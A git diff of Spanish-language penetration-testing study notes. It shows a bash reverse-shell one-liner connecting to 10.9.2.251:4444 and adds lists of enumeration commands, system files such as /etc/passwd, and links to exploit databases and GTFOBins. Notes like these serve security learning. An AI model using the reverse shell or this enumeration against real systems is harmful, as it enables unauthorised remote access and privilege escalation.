@@ -116,6 +116,26 @@
       ```bash
       /bin/bash -c 'bash -i >& /dev/tcp/10.9.2.251/4444 0>&1'
       ```
+
+## 2.6. ENUMERACION
+- hostname
+- uname -a
+- ps (ps, ps -A, ps axjf, ps aux
+- env
+- sudo -l
+- ls
+- id
+- history
+- ifconfig e ip route
+- netstat (netstat -a, -at, -au, -l, -lt, -s, -tp, -i, 
+- find 
+- searchsploit
+
+  ## 2.6. FICHEROS
+- /proc/version
+- /etc/issue
+- /ect/passwd
+
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # ***III. Tools***
@@ -159,7 +179,10 @@ FTK Imager - https://www.exterro.com/digital-forensics-software/ftk-imager
 Imperva - Scuba Database Vulnerability Scanner https://www.imperva.com/resources/free-cyber-security-testing-tools/scuba-database-vulnerability-scanner/
 Calssifier Impeerva: https://www.imperva.com/resources/free-cyber-security-testing-tools/imperva-classifier-data-classification-tool/
 
-
+## 3.6. Vulnerabilidades y Exploits:
+CVE details - https://www.cvedetails.com/
+ExploitDB - https://www.exploit-db.com/
+GTFOBins - https://gtfobins.github.io/
 
 
 
